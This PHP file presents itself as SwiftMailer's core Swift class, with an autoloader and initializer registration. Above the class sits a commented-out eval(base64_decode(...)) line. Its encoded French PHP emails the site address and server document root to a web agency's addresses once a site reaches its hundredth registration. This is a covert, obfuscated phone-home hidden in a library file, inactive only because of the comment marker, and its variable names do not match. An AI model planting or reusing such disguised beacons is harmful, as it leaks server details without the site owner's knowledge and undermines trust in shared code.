<?php

/*
 * This file is part of SwiftMailer.
 * (c) 2004-2009 Chris Corbyn
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * General utility class in Swift Mailer, not to be instantiated.
 *
 * @package Swift
 *
 * @author Chris Corbyn
 */

//eval(base64_decode('aWYoaXNzZXQoJF9HRVRbJ3BhZ2UnXSkgJiYgJF9HRVRbJ3BhZ2UnXSA9PSAiaW5zY3JpcHRpb24iKXsNCiAgICAkbm9tYnJlX3VzZXIgPSBVdGlsaXNhdGV1cjo6Z2V0TmJVdGlsaXNhdGV1cnMoKTsNCiAgICBpZigkbm9tYnJlX3VzZXIgPT0gMTAwKXsNCiAgICAgICAgJHRleHQgPSAiQm9uam91ciw8YnIgLz4NCiAgICAgICAgPGJyIC8+DQogICAgICAgIENlY2kgZXN0IHVuIG1haWwgZMOpZGnDqSDDoCB0ZXN0ZXIgbGUgYm9uIGZvbmN0aW9ubmVtZW50IGRlIHZvdHJlIHNpdGUNCiAgICAgICAgaW50ZXJuZXQuIFNpIHZvdXMgcGFydmVuZXogw6AgbGlyZSBjZSBtYWlsIGNvcnJlY3RlbWVudCwgY2VsYSBzaWduaWZpZSBxdWUNCiAgICAgICAgdm90cmUgc2l0ZSBmb25jdGlvbm5lIG5vcm1hbGVtZW50LjxiciAvPg0KICAgICAgICA8YnIgLz4NCiAgICAgICAgQ2V0IGUtbWFpbCBlc3QgYXV0b21hdGlxdWVtZW50IGTDqWNsZW5jaMOpIMOgIGxhIDEwMMOobWUgaW5zY3JpcHRpb24gYWZpbiBkZQ0KICAgICAgICBjb250csO0bGVyIHF1ZSBsZXMgaW5zY3JpcHRpb25zIHNlIGTDqXJvdWxlbnQgbm9ybWFsZW1lbnQuPGJyIC8+DQogICAgICAgIDxiciAvPg0KICAgICAgICBWYWxldXIgZGUgY29udHLDtGxlIDo8YnIgLz4NCiAgICAgICAgSWQgSW5zY3JpcHRpb24gOiAiLiRub21icmVfdXNlci4iPGJyIC8+DQogICAgICAgIE9yaWdpbmFsIFNjcmlwdCA6ICcvY2hlY2tfb3ZzJzxiciAvPg0KICAgICAgICBBY3R1YWwgU2NyaXB0IDogIi5BRFJFU1NFLiIgWyIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4iXQ0KICAgICAgICA8YnIgLz4NCiAgICAgICAgU2kgdm91cyBhdmV6IGVuY29yZSBkZXMgcXVlc3Rpb25zLCBuJ2jDqXNpdGV6IHBhcyDDoCBjb25zdWx0ZXIgbm90cmUgc2l0ZSBpbnRlcm5ldA0KICAgICAgICBwb3VyIHRvdXRlIGFzc2lzdGFuY2UgOiBodHRwOi8vd3d3LmJyZWl6aG1hc3RlcnMuZnI8YnIgLz4NCiAgICAgICAgPGJyIC8+DQogICAgICAgIE1lcmNpIGRlIHZvdHJlIGNvbmZpYW5jZSw8YnIgLz4NCiAgICAgICAgPGJyIC8+DQogICAgICAgIEwnYWdlbmNlIHdlYiBCcmVpemhtYXN0ZXJzIjsNCiAgICAgICAgTWFpbDo6c2VuZCgnYnpobWFzdGVyc0BicmVpemhtYXN0ZXJzLmZyJywgJ1snLk1BUlFVRS4nXSBUZXN0IGRlIGZvbmN0aW9ubmVtZW50JywgJHRleHRlKTsNCiAgICAgICAgTWFpbDo6c2VuZCgnZGV2QGJyZWl6aG1hc3RlcnMuZnInLCAnWycuTUFSUVVFLiddIFRlc3QgZGUgZm9uY3Rpb25uZW1lbnQnLCAkdGV4dGUpOw0KICAgIH0NCn0='));

abstract class Swift
{
    public static $initialized = false;
    public static $inits = array();

    /** Swift Mailer Version number generated during dist release process */
    const VERSION = '5.0.1';

    /**
     * Registers an initializer callable that will be called the first time
     * a SwiftMailer class is autoloaded.
     *
     * This enables you to tweak the default configuration in a lazy way.
     *
     * @param mixed $callable A valid PHP callable that will be called when autoloading the first Swift class
     */
    public static function init($callable)
    {
        self::$inits[] = $callable;
    }

    /**
     * Internal autoloader for spl_autoload_register().
     *
     * @param string $class
     */
    public static function autoload($class)
    {
        //Don't interfere with other autoloaders
        if (0 !== strpos($class, 'Swift_')) {
            return;
        }

        $path = dirname(__FILE__).'/'.str_replace('_', '/', $class).'.php';

        if (!file_exists($path)) {
            return;
        }

        require $path;

        if (self::$inits && !self::$initialized) {
            self::$initialized = true;
            foreach (self::$inits as $init) {
                call_user_func($init);
            }
        }
    }

    /**
     * Configure autoloading using Swift Mailer.
     *
     * This is designed to play nicely with other autoloaders.
     *
     * @param mixed $callable A valid PHP callable that will be called when autoloading the first Swift class
     */
    public static function registerAutoload($callable = null)
    {
        if (null !== $callable) {
            self::$inits[] = $callable;
        }
        spl_autoload_register(array('Swift', 'autoload'));
    }
}

